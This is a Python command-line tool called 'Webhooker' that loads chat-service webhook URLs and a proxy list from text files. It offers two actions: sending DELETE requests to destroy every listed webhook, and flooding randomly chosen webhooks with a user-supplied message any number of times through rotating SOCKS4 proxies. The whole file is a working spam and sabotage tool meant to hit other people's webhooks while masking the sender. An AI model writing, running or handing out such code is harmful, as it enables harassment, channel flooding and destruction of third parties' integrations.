import requests
import threading
import random
import time
import os
import colorama
from colorama import init
from colorama import Fore
init(convert=True)

proxiesfile = open("proxies.txt", "r")
proxies = []
for line in proxiesfile: proxies.append(line.strip())

webhooksfile = open("webhooks.txt", "r")
webhooks = []
for line in webhooksfile.readlines(): webhooks.append(line.strip())

def menu():
    os.system('title Webhooker best ww')
    print(Fore.LIGHTRED_EX + '''
                         __        __                            __                           
                        /  |      /  |                          /  |                          
 __   __   __   ______  $$ |____  $$ |____    ______    ______  $$ |   __   ______    ______  
/  | /  | /  | /      \ $$      \ $$      \  /      \  /      \ $$ |  /  | /      \  /      \ 
$$ | $$ | $$ |/$$$$$$  |$$$$$$$  |$$$$$$$  |/$$$$$$  |/$$$$$$  |$$ |_/$$/ /$$$$$$  |/$$$$$$  |
$$ | $$ | $$ |$$    $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$ |  $$ |$$   $$<  $$    $$ |$$ |  $$/ 
$$ \_$$ \_$$ |$$$$$$$$/ $$ |__$$ |$$ |  $$ |$$ \__$$ |$$ \__$$ |$$$$$$  \ $$$$$$$$/ $$ |      
$$   $$   $$/ $$       |$$    $$/ $$ |  $$ |$$    $$/ $$    $$/ $$ | $$  |$$       |$$ |      
 $$$$$/$$$$/   $$$$$$$/ $$$$$$$/  $$/   $$/  $$$$$$/   $$$$$$/  $$/   $$/  $$$$$$$/ $$/       
                                                                                              
                                                                                              
                                                                                              ''')
    print('''
1 => delete webhooks
2 => spam webhooks    
    ''' + Fore.LIGHTBLUE_EX)



while True:
    os.system('cls')
    menu()
    option = int(input('=> '))
    if option == 1:
        deleted = 0
        for webhook in webhooks:
            resp = requests.delete(webhook)
            if resp.status_code == 204:
                print('deleted!')
                deleted+=1
            print(f'done, deleted {deleted} webhooks')
            time.sleep(3)
            os.system('cls')
            menu()
    elif option == 2:
        cnt = input('message:')
        amnt = int(input('how many times to send message:'))
        for i in range(amnt):
            resp = requests.post(random.choice(webhooks), json={"content": cnt}, proxies={"http": f"socks4://{random.choice(proxies)}"})
            if resp.status_code == 404:
                print(Fore.LIGHTRED_EX + '[-]' + Fore.LIGHTBLUE_EX + 'webhook invalid')
            if resp.status_code == 204:
                print(Fore.LIGHTGREEN_EX + '[+]' + Fore.LIGHTBLUE_EX + 'sent!')
            time.sleep(0)
        print('done!')
        time.sleep(3)
        os.system('cls')
        menu()
    else:
        print('invalid choice!')

